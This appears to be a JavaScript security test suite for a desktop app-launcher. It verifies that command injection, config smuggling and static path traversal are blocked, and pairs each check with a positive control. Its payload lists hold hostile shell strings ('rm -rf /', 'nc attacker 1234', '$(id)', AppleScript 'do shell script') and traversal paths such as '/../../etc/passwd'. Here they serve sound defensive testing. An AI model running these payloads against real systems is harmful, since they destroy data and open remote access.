/**
 * G7: hostile input is rejected, proven against positive controls.
 *
 * Every absence claim here is paired with a control that MUST be caught by the
 * same detector. An absence check with no positive control can pass because the
 * detector is broken, so each detector is exercised on known-bad input first.
 */
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { createChecker } from "./lib/assert.mjs";
import { validateControl } from "../src/platform/contract.js";
import { createMacProvider } from "../src/platform/macos.js";
import { createExec } from "../src/platform/index.js";
import { normalizeTile, normalizeTiles } from "../src/config.js";
import { resolveStatic } from "../server.js";

const t = createChecker("injection");
const root = join(import.meta.dirname, "..");
const PUBLIC = join(root, "public");

/** Payloads that would execute a second command in any shell-joined pipeline. */
const PAYLOADS = [
  "a & shutdown /s /t 0",
  "a && rm -rf /",
  "a; rm -rf /",
  "a | nc attacker 1234",
  "a`id`",
  "a$(id)",
  'a" & calc & "',
  "a\nshutdown /s",
  "a\r\nshutdown /s",
  "%SYSTEMROOT%\\system32\\calc.exe",
  '"; rm -rf ~',
  "a\" & do shell script \"id\" & \"",
  "a\nend run\ndo shell script \"id\"",
];

// ---- 1. argv containment ----
// Detector: a caller-derived value is safe only when it appears as a whole argv
// entry. Appearing inside a larger entry (a script source, a joined command)
// means it was spliced into something that gets interpreted.
const spliced = (calls, value) =>
  calls.some(({ args }) => args.some((a) => a !== value && a.includes(value)));
const intact = (calls, value) => calls.some(({ args }) => args.includes(value));

for (const payload of PAYLOADS) {
  const calls = [];
  const mac = createMacProvider({
    appDirs: [],
    extraApps: [],
    exec: async (file, args) => {
      calls.push({ file, args: [...args] });
      return { stdout: "" };
    },
  });
  const bundle = `/Applications/${payload}.app`;
  await mac.launchApp({ target: bundle });
  t.deepEqual(calls[0].args, ["-a", bundle], `launch keeps the payload as one argument: ${JSON.stringify(payload)}`);
  await mac.focusApp({ pid: 7, path: bundle });
  t.deepEqual(calls[1].args, ["-a", bundle], `focus keeps the payload as one argument: ${JSON.stringify(payload)}`);
  await mac.closeApp({ pid: 7, path: bundle });
  t.equal(calls[2].args.length, 3, `close argv stays [-e, script, path]: ${JSON.stringify(payload)}`);
  t.equal(calls[2].args[2], bundle, `close passes the payload verbatim as its own entry: ${JSON.stringify(payload)}`);
  await mac.writeClipboard(payload);
  t.equal(calls[3].args.at(-1), payload, `clipboard text travels as its own entry: ${JSON.stringify(payload)}`);
  await mac.appIcon({ target: bundle });
  t.ok(intact([calls[4]], bundle), `icon extraction passes the bundle as its own entry: ${JSON.stringify(payload)}`);
  t.ok(!spliced(calls, bundle), `the app path is never spliced into a script or command: ${JSON.stringify(payload)}`);
  t.ok(!spliced([calls[3]], payload), `clipboard text is never spliced into the script: ${JSON.stringify(payload)}`);
  t.ok(calls.every((c) => !c.file.includes(payload)), `payload never chooses the executable: ${JSON.stringify(payload)}`);
  mac.dispose();
}

// Positive control: a deliberately spliced AppleScript and a shell-split
// launcher MUST both be flagged, proving the checks above can actually fail.
const bad = '/Applications/"; rm -rf ~.app';
t.ok(spliced([{ args: ["-e", `tell application "${bad}" to quit`] }], bad), "positive control: a spliced script is detected");
const joined = ["-a", ...bad.split(" ")];
t.ok(joined.length !== 2 && !joined.includes(bad), "positive control: a shell-splitting launcher is detected");

// ---- 2. exec refuses non-string argv outright ----
const exec = createExec();
for (const bad of [["a", 1], ["a", null], ["a", {}], "notanarray"]) {
  await t.rejects(() => exec("echo", bad), `exec rejects non-string args: ${JSON.stringify(bad)}`);
}
await t.rejects(() => exec("", []), "exec rejects an empty file");
await t.rejects(() => exec(null, []), "exec rejects a null file");

// ---- 3. control verbs are allowlisted ----
for (const payload of PAYLOADS) {
  t.ok(!validateControl(payload, null).ok, `hostile verb rejected: ${JSON.stringify(payload)}`);
  t.ok(!validateControl(`volume-up${payload}`, null).ok, `suffixed verb rejected: ${JSON.stringify(payload)}`);
}
// Positive control: the validator must still admit a real verb, or the
// rejections above would be meaningless.
t.ok(validateControl("volume-up", null).ok, "positive control: a real verb is still accepted");

// ---- 4. config cannot smuggle a verb or a control character ----
t.equal(normalizeTile({ kind: "control", verb: "shutdown; rm -rf /" }), null, "hostile control tile is dropped");
t.equal(normalizeTile({ kind: "control", verb: "" }), null, "empty verb is dropped");
t.equal(normalizeTile({ kind: "nope", verb: "lock" }), null, "unknown tile kind is dropped");
t.equal(normalizeTile({ kind: "app", id: "", target: "x" }), null, "app tile without an id is dropped");
t.equal(normalizeTile({ kind: "app", id: "x", target: "" }), null, "app tile without a target is dropped");
t.equal(normalizeTile(null), null, "null tile is dropped");

const stripped = normalizeTile({ kind: "app", id: "a\u0000b", target: "t", label: "L\u0007M" });
t.ok(!stripped.id.includes("\u0000"), "NUL is stripped from a tile id");
t.ok(!stripped.label.includes("\u0007"), "control characters are stripped from a label");
// Positive control: the sanitizer must keep a clean tile intact.
const clean = normalizeTile({ kind: "control", verb: "lock", label: "Lock" });
t.ok(clean && clean.verb === "lock", "positive control: a valid control tile survives");

const deduped = normalizeTiles([
  { kind: "control", verb: "lock" },
  { kind: "control", verb: "lock" },
  { kind: "app", id: "a", target: "t" },
  { kind: "app", id: "a", target: "t" },
]);
t.equal(deduped.length, 2, "duplicate tiles collapse");
t.deepEqual(normalizeTiles("not an array"), [], "non-array tile input yields an empty list");
t.deepEqual(normalizeTiles([1, "x", null, {}]), [], "junk tile entries are all dropped");

// ---- 5. static path traversal ----
const TRAVERSALS = [
  "/../server.js",
  "/../../etc/passwd",
  "/..%2fserver.js",
  "/%2e%2e/server.js",
  "/subdir/../../server.js",
  "/....//server.js",
];
for (const p of TRAVERSALS) {
  const resolved = resolveStatic(p, PUBLIC);
  const escaped = resolved !== null && !resolved.startsWith(PUBLIC);
  t.ok(!escaped, `traversal contained: ${p} -> ${resolved ?? "refused"}`);
}
// Positive control: a normal asset must still resolve inside public/, proving
// resolveStatic is not simply refusing everything.
const ok = resolveStatic("/style.css", PUBLIC);
t.ok(ok !== null && ok.startsWith(PUBLIC), "positive control: a normal asset resolves inside public");
t.equal(resolveStatic("/", PUBLIC), join(PUBLIC, "index.html"), "root resolves to index.html");
// Positive control for the escape detector itself.
t.ok(!join(PUBLIC, "..", "server.js").startsWith(PUBLIC + "/"), "positive control: escape detector works");

// ---- 6. no provider source builds a command from a template or a shell ----
const platformDir = join(root, "src", "platform");
const sources = readdirSync(platformDir).filter((f) => f.endsWith(".js"));
t.ok(sources.includes("macos.js") && sources.includes("linux.js"), `found ${sources.length} provider sources to inspect`);
t.ok(!sources.includes("windows.js") && !sources.includes("capture.js"), "the removed Windows sources stay removed");
for (const file of sources) {
  const src = readFileSync(join(platformDir, file), "utf8");
  t.ok(!/exec\(\s*`/.test(src), `${file}: no exec call is built from a template literal`);
  t.ok(!/shell:\s*true/.test(src), `${file}: nothing spawns through a shell`);
  t.ok(!/do shell script/.test(src), `${file}: no AppleScript reaches a shell`);
}
// Every value that reaches an AppleScript source is interpolated only from a
// fixed allowlist: the player names and the scriptable-player bundle ids.
const macSrc = readFileSync(join(platformDir, "macos.js"), "utf8");
const interpolated = [...macSrc.matchAll(/tell application(?: id)? "\$\{(\w+)\}"/g)].map((m) => m[1]);
t.deepEqual(interpolated.sort(), ["bundleId", "player"], "only allowlisted names are interpolated into AppleScript");
t.ok(/if \(!PLAYERS\.includes\(player\)\) throw/.test(macSrc), "player names are checked against the allowlist first");
// Positive control: the detectors must flag known-bad samples.
t.ok(/exec\(\s*`/.test("exec(`osascript -e ${evil}`)"), "positive control: template exec detector works");
t.ok(/\$\{/.test("const x = `a ${evil} b`;"), "positive control: interpolation detector works");

t.done("injection verification passed");
